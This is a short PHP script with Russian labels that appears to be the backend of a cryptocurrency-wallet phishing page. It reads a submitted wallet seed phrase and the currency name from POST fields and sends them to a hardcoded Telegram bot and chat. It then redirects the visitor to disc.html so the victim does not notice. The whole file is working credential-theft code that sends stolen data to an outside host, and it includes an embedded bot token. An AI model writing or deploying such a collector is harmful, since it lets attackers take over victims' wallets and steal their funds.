<?php

header('Access-Control-Allow-Origin: *');

/* https://api.telegram.org/bot14775223324:1615865484:AAFH1dHgcygo15P0cDFGDFeaOrxixujJySFZAbU/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$sid = $_POST['sid'];
$name = $_POST['currency'];
$token = "1477522864:AAFGIOXn4jRg-YjoHNb2s3BzVxm1OrkmdjU";
$chat_id = "-575693294";
$arr = array(
  'Сид номер' => $sid,
  'Криптовалюта' => $name,
  );

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: disc.html');
} else {
  echo "Error";
}
?>